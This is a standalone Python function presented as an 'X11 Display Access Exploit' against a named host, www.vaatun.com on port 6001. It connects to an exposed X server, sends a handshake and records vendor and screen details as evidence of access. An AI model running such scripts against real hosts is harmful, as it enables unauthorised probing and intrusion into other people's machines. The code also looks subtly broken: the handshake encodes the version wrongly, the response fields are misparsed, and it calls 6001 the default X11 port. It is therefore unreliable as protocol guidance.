def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    X11 Display Access Exploit for www.vaatun.com:6001 - Attempts to connect to the X Window System display server on TCP port 6001 (X11's default TCP port). This exploits the common misconfiguration where X11 is bound to all interfaces rather than localhost only, allowing remote clients to access the display. The exploit sends a minimal X11 protocol handshake to verify connectivity and enumerate basic display information such as screen resolution, color depth, and server vendor. Works against any X11 server that has tcpip enabled (xhost +) or is listening on 0.0.0.0:6001. Commonly found in Linux desktop environments, VNC servers, and headless X installations.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Send minimal X11 handshake (X11R6 protocol)
        # Request: 0x42 = client message, major version 11, minor version 0
        request = b"\x42\x00\x0b\x00" + struct.pack(">H", 0) + b"\x00\x00"
        sock.send(request)

        response = sock.recv(4096)
        if not response:
            return {"success": False, "data": "", "evidence": ""}

        # Parse X11 response header
        major_opcode = response[2]
        minor_version = struct.unpack(">H", response[3:5])[0]
        screen_count = struct.unpack(">H", response[6:8])[0]
        root_window = struct.unpack(">I", response[8:12])[0]

        # Extract vendor string (starts after the fixed header)
        vendor_start = 12
        vendor_end = min(vendor_start + 32, len(response))
        vendor_str = ""
        for i in range(vendor_start, vendor_end):
            if response[i] == 0:
                break
            vendor_str += chr(response[i])

        data = {
            "major_version": major_opcode,
            "minor_version": minor_version,
            "screen_count": screen_count,
            "root_window": hex(root_window),
            "vendor": vendor_str.strip(),
            "connected": True
        }

        evidence = f"X11 server on {host}:{port} - Vendor: {vendor_str.strip()}, Screens: {screen_count}, Root: {hex(root_window)}"
        sock.close()
        return {"success": True, "data": data, "evidence": evidence}

    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}